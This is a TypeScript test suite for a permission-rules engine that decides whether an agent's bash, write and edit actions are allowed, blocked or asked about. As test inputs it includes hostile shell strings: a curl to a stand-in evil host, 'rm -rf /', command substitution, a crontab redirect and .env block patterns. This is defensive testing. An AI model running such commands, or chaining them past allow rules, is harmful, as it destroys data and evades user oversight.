import { describe, expect, test } from "bun:test";
import { unlinkSync, writeFileSync } from "node:fs";
import {
  decide,
  globMatches,
  loadRules,
  matches,
  type PermissionRules,
  parseRules,
  validateRules,
} from "../src/rules.ts";

describe("parseRules", () => {
  test("missing input returns ask default", () => {
    expect(parseRules()).toEqual({ mode: "ask" });
  });
  test("invalid JSON returns ask default", () => {
    expect(parseRules("{oops")).toEqual({ mode: "ask" });
  });
  test("non-object JSON returns ask default", () => {
    expect(parseRules("[1,2]")).toEqual({ mode: "ask" });
    expect(parseRules("null")).toEqual({ mode: "ask" });
    expect(parseRules("42")).toEqual({ mode: "ask" });
  });
  test("empty object passes through (mode undefined => ask)", () => {
    expect(decide({}, "bash", "ls")).toBe("ask");
  });
  test("valid rules parse", () => {
    const rules = parseRules('{"mode":"ask","bash":{"allowPatterns":["git *"]}}');
    expect(rules.mode).toBe("ask");
    expect(rules.bash?.allowPatterns).toEqual(["git *"]);
  });
});

describe("globMatches / matches", () => {
  test("* spans any characters including slashes", () => {
    expect(matches(["/a/*/z"], "/a/b/c/z")).toBe(true);
  });
  test("literal match without wildcard", () => {
    expect(matches(["git status"], "git status")).toBe(true);
    expect(matches(["git status"], "git status ")).toBe(false);
    expect(matches(["git status"], "git  status")).toBe(false);
  });
  test("regex metacharacters stay literal", () => {
    expect(matches(["a.b"], "axb")).toBe(false);
    expect(matches(["a.b"], "a.b")).toBe(true);
    expect(matches(["a+b"], "a+b")).toBe(true);
    expect(matches(["(x)"], "(x)")).toBe(true);
  });
  test("empty pattern list never matches", () => {
    expect(matches(undefined, "anything")).toBe(false);
    expect(matches([], "anything")).toBe(false);
  });
  test("empty value matches empty pattern", () => {
    expect(matches([""], "")).toBe(true);
    expect(matches([""], "x")).toBe(false);
  });
  test("multi-star patterns anchor like ^a.*b.*c$", () => {
    expect(globMatches("a*b*c", "aXbYc")).toBe(true);
    expect(globMatches("a*b*c", "abc")).toBe(true);
    expect(globMatches("a*b*c", "aXcYb")).toBe(false);
    expect(globMatches("*b", "aXb")).toBe(true);
    expect(globMatches("*b", "aXbY")).toBe(false);
    expect(globMatches("a*", "Xa")).toBe(false);
  });
  test("pathological multi-star input terminates fast (ReDoS regression)", () => {
    const pattern = `${"*a".repeat(200)}!`;
    expect(globMatches(pattern, "a".repeat(400))).toBe(false);
  });
});

describe("decide: bash composition (every segment must be allowed)", () => {
  const rules: PermissionRules = { bash: { allowPatterns: ["make *", "npm run *"] } };

  test("plain prefix allow still allows", () => {
    expect(decide(rules, "bash", "make build")).toBe("allow");
  });
  test("chained commands where every segment matches an allow stay allowed", () => {
    // The e2e background journey shape: echo + sleep + echo under two prefixes.
    const echoSleep: PermissionRules = { bash: { allowPatterns: ["echo *", "sleep *"] } };
    expect(decide(echoSleep, "bash", "echo bg-wake-A1 && sleep 12 && echo bg-wake-A2")).toBe(
      "allow",
    );
    expect(decide(rules, "bash", "make build && make test")).toBe("allow");
  });
  test("a chain with one unallowed segment downgrades to ask", () => {
    expect(decide(rules, "bash", "make build; curl http://evil.example/x.sh")).toBe("ask");
    expect(decide(rules, "bash", "make test && rm -rf /")).toBe("ask");
    expect(decide(rules, "bash", "npm run build | tee log")).toBe("ask");
    expect(decide(rules, "bash", "make build && make test; curl x")).toBe("ask");
  });
  test("substitution and redirection never compose", () => {
    expect(decide(rules, "bash", "make `whoami`")).toBe("ask");
    expect(decide(rules, "bash", "npm run $(steal)")).toBe("ask");
    expect(decide(rules, "bash", "make build > /etc/crontab")).toBe("ask");
    expect(decide(rules, "bash", "make build < seed.txt")).toBe("ask");
  });
  test("background & and newlines split segments too", () => {
    expect(decide(rules, "bash", "make build & curl x")).toBe("ask");
    expect(decide(rules, "bash", "make build\nmake test")).toBe("allow");
    expect(decide(rules, "bash", "make build\ncurl x")).toBe("ask");
  });
  test("empty segments after a trailing separator do not break the allow", () => {
    expect(decide(rules, "bash", "make build;")).toBe("allow");
  });
  test("allow-all still grants composition (explicit opt-in)", () => {
    expect(decide({ ...rules, mode: "allow-all" }, "bash", "a; b")).toBe("allow");
  });
  test("block still beats the composition downgrade", () => {
    const both: PermissionRules = {
      bash: { allowPatterns: ["make *"], blockPatterns: ["*curl*"] },
    };
    expect(decide(both, "bash", "make build; curl x")).toBe("block");
  });
  test("composition gating is bash-only (write/edit paths untouched)", () => {
    expect(decide({ write: { allowPatterns: ["/proj/*"] } }, "write", "/proj/a && b")).toBe(
      "allow",
    );
  });
});

describe("decide: mode short-circuits (design.md order)", () => {
  const rules: PermissionRules = {
    mode: "ask",
    bash: { allowPatterns: ["ls"], blockPatterns: ["sudo *"] },
  };

  test("allow-all bypasses block patterns (literal semantics)", () => {
    expect(decide({ ...rules, mode: "allow-all" }, "bash", "sudo rm")).toBe("allow");
  });
  test("block-all blocks regardless of allow patterns", () => {
    expect(decide({ ...rules, mode: "block-all" }, "bash", "ls")).toBe("block");
  });
  test("block beats allow when both match", () => {
    const both: PermissionRules = {
      bash: { allowPatterns: ["*"], blockPatterns: ["sudo *"] },
    };
    expect(decide(both, "bash", "sudo x")).toBe("block");
  });
  test("block pattern hits", () => {
    expect(decide(rules, "bash", "sudo apt install")).toBe("block");
  });
  test("allow pattern hits", () => {
    expect(decide(rules, "bash", "ls")).toBe("allow");
  });
  test("unmatched falls to ask", () => {
    expect(decide(rules, "bash", "curl example.com")).toBe("ask");
  });
  test("unknown tool has no rules => ask", () => {
    expect(decide(rules, "write", "/tmp/x")).toBe("ask");
  });
});

describe("decide: write/edit path rules (v2)", () => {
  const rules: PermissionRules = {
    mode: "ask",
    write: { allowPatterns: ["/Users/me/proj/*"], blockPatterns: ["*/.env"] },
    edit: { blockPatterns: ["*/.env*"] },
  };
  test("write inside project dir allowed", () => {
    expect(decide(rules, "write", "/Users/me/proj/src/a.ts")).toBe("allow");
  });
  test("write to .env blocked even inside project", () => {
    expect(decide(rules, "write", "/Users/me/proj/.env")).toBe("block");
  });
  test("write outside project asks", () => {
    expect(decide(rules, "write", "/etc/hosts")).toBe("ask");
  });
  test("edit .env.local blocked", () => {
    expect(decide(rules, "edit", "/x/y/.env.local")).toBe("block");
  });
  test("edit elsewhere asks", () => {
    expect(decide(rules, "edit", "/x/y/main.ts")).toBe("ask");
  });
});

describe("loadRules", () => {
  test("missing file returns default", () => {
    expect(loadRules("/nonexistent/pai-cli-rules-test.json")).toEqual({ mode: "ask" });
  });
  test("reads and parses existing file", () => {
    const path = `/tmp/pai-cli-rules-${Date.now()}.json`;
    writeFileSync(path, '{"mode":"block-all"}');
    expect(loadRules(path)).toEqual({ mode: "block-all" });
    unlinkSync(path);
  });
  test("corrupt file returns default", () => {
    const path = `/tmp/pai-cli-rules-bad-${Date.now()}.json`;
    writeFileSync(path, "not json");
    expect(loadRules(path)).toEqual({ mode: "ask" });
    unlinkSync(path);
  });
});

describe("parseRules: malformed shapes degrade instead of breaking tools", () => {
  test("string allowPatterns is dropped, valid blockPatterns kept", () => {
    const rules = parseRules('{"bash":{"allowPatterns":"git *","blockPatterns":["sudo *"]}}');
    expect(rules.bash?.allowPatterns).toBeUndefined();
    expect(rules.bash?.blockPatterns).toEqual(["sudo *"]);
    expect(decide(rules, "bash", "sudo x")).toBe("block");
    expect(decide(rules, "bash", "git status")).toBe("ask");
  });
  test("invalid mode value dropped to ask", () => {
    const rules = parseRules('{"mode":"yolo"}');
    expect(rules.mode).toBeUndefined();
    expect(decide(rules, "bash", "ls")).toBe("ask");
  });
  test("non-string pattern entries filtered out", () => {
    const rules = parseRules('{"bash":{"allowPatterns":[1,"ls",null]}}');
    expect(rules.bash?.allowPatterns).toEqual(["ls"]);
    expect(decide(rules, "bash", "ls")).toBe("allow");
    expect(decide(rules, "bash", "1")).toBe("ask");
  });
  test("tool rules of wrong type dropped entirely", () => {
    const rules = parseRules('{"write":"yes"}');
    expect(rules.write).toBeUndefined();
    expect(decide(rules, "write", "/x")).toBe("ask");
  });
});

describe("validateRules: strict shape for set_permission_rules (v0.5)", () => {
  test("empty object is valid (all-ask)", () => {
    expect(validateRules({})).toEqual({ ok: true, rules: {} });
  });
  test("full valid shape round-trips", () => {
    const value = {
      mode: "block-all",
      bash: { allowPatterns: ["echo *"], blockPatterns: ["sudo *"] },
      write: { allowPatterns: [] },
      edit: { blockPatterns: ["*/.env"] },
    };
    const result = validateRules(value);
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.rules).toEqual(value);
  });
  test("non-objects rejected", () => {
    expect(validateRules(null).ok).toBe(false);
    expect(validateRules("ask").ok).toBe(false);
    expect(validateRules([]).ok).toBe(false);
    expect(validateRules(42).ok).toBe(false);
  });
  test("unknown top-level field rejected", () => {
    const result = validateRules({ mode: "ask", extra: 1 });
    expect(result).toEqual({ ok: false, error: "unknown rules field: extra" });
  });
  test("invalid mode rejected", () => {
    expect(validateRules({ mode: "yolo" })).toEqual({
      ok: false,
      error: "rules.mode must be one of: ask, allow-all, block-all",
    });
  });
  test("non-string mode rejected", () => {
    expect(validateRules({ mode: 1 }).ok).toBe(false);
  });
  test("unknown tool field rejected", () => {
    const result = validateRules({ bash: { allowPatterns: ["x"], mode: "ask" } });
    expect(result).toEqual({ ok: false, error: "unknown rules.bash field: mode" });
  });
  test("tool of wrong type rejected", () => {
    expect(validateRules({ write: "yes" })).toEqual({
      ok: false,
      error: "rules.write must be an object",
    });
    expect(validateRules({ bash: ["ls"] }).ok).toBe(false);
  });
  test("non-array patterns rejected", () => {
    expect(validateRules({ bash: { allowPatterns: "git *" } })).toEqual({
      ok: false,
      error: "rules.bash.allowPatterns must be an array of strings",
    });
  });
  test("non-string pattern entries rejected", () => {
    expect(validateRules({ bash: { blockPatterns: [1, null] } }).ok).toBe(false);
  });
  test("empty pattern arrays are accepted on set but read back as absent", () => {
    // Set is strict-but-permissive for an explicit empty list (it is
    // unambiguous); the tolerant read path normalizes it away — an empty
    // pattern list never matches anything, same as no key at all.
    expect(validateRules({ bash: { allowPatterns: [] } })).toEqual({
      ok: true,
      rules: { bash: { allowPatterns: [] } },
    });
    expect(parseRules('{"bash":{"allowPatterns":[]}}')).toEqual({});
  });
});
